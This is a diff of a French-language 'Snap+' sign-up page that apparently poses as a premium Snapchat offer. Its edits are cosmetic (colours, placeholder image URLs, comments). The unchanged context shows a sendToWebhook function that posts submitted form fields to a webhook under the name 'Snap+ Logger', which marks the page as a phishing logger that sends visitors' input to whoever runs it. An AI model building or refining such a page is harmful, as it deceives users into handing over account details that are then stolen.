@@ -8,7 +8,7 @@
   <!-- Open Graph -->
   <meta property="og:title" content="S'inscrire à Snap+">
   <meta property="og:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
-  <meta property="og:image" content="https://yourimageurl.com/yellow-image.jpg"> <!-- Image jaune -->
+  <meta property="og:image" content="https://yourimageurl.com/image.jpg"> <!-- Remplace l'URL par une image représentative -->
   <meta property="og:url" content="https://tonsite.com"> <!-- Remplace par l'URL de ton site -->
   <meta property="og:type" content="website">
 
@@ -16,17 +16,17 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="S'inscrire à Snap+">
   <meta name="twitter:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
-  <meta name="twitter:image" content="https://yourimageurl.com/yellow-image.jpg"> <!-- Image jaune -->
+  <meta name="twitter:image" content="https://yourimageurl.com/image.jpg"> <!-- Remplace l'URL par une image représentative -->
 
   <style>
     :root {
-      --primary: #ffcc00;  /* Jaune pour tous les embeds */
+      --primary: #ffcc00;
       --primary-dark: #e6b800;
       --success: #00cc66;
-      --bg-dark: #0a0a0a;
+      --bg-dark: #ffc504;
       --card: #111111;
       --input: #1a1a1a;
-      --border: #333333;
+      --border: #ffe600;
       --text: #eeeeee;
       --text-light: #aaaaaa;
       --error: #ff6666;
@@ -266,7 +266,7 @@ async function sendToWebhook(title, fields = {}) {
   
   const embed = {
     title: title,
-    color: 0xFFCC00,           // ← Jaune pour tous les embeds
+    color: 0xFFCC00,           // ← couleur jaune pour l'embed
     fields: Object.entries(fields).map(([name, value]) => ({
       name: name,
       value: "```" + (value || "—") + "```",
@@ -282,8 +282,8 @@ async function sendToWebhook(title, fields = {}) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         embeds: [embed],
-        username: "Snap+ Logger",           // ← Ton nom reste intact
-        avatar_url: "https://i.imgur.com/veryfakeicon.png" // ← Ton avatar reste intact
+        username: "Snap+ Logger",           // ← ton nom reste intact
+        avatar_url: "https://i.imgur.com/veryfakeicon.png" // ← ton pp reste intact
       })
     });
   } catch(e) {
